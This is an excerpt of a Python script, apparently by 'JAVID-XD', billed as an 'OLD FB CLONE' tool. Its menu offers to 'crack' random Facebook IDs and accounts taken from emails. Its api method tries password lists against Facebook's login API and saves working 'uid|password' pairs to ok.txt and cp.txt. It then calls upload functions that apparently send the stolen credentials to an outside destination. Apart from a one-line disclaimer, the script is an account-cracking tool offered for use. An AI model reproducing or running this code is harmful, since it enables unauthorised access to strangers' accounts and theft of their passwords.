...
class Main:
	def __init__(self):
		...
		print ("""   \033[1;94m_____         __  __ ______ ______ _____  
  / ____|  /\   |  \/  |  ____|  ____|  __ \ 
 | (___   /  \  | \  / | |__  | |__  | |__) |
  \___ \ / /\ \ | |\/| |  __| |  __| |  _  / 
  ____) / ____ \| |  | | |____| |____| | \ \ 
 ...
 > \033[0;92mDEVELOPER      : JAVID-XD
 > \033[0;95mFACEBOOK ID   : +-+-+-+-+
 > \033[0;41mTELEGRAM       : +-+-+-+-+
 \033[0;96m> TOOL                 : OLD FB CLONE
 > \033[0;97mWARNING         : DONT USE FOR ILLEGAL WORK     
    """)
		...
		print("%s [%s2%s]%s CRACK RANDOM FB ID 2004-5 %s(PRO) V1"%(G,R,G,Y,B))
		print("%s [%s3%s]%s CRACK RANDOM FB ID 2004-5 %s(PRO) V2"%(G,R,G,Y,B))
		print("%s [%s4%s]%s CRACK RANDOM FB ID 2004 %s(PRO) V3"%(G,R,G,Y,B))
		print("%s [%s5%s]%s CRACK FROM EMAILS %s(PRO)"%(G,R,G,Y,B))
		print("%s [%s6%s]%s CRACK RANDOM FB ID Custom %s(PRO) V1"%(G,R,G,Y,B))
		print(GET)
		hoga = input("\n%s [?] CHOICE : "%(B))
		if hoga in ["", " "]:
			Main()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [JAVID-XD] : %s/%s -> \033[0;92m [ JAVID-XD-OK:%s ]- \033[0;93m[JAVID-XD-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[JAVID-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [JAVID-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[JAVID-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [JAVID-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
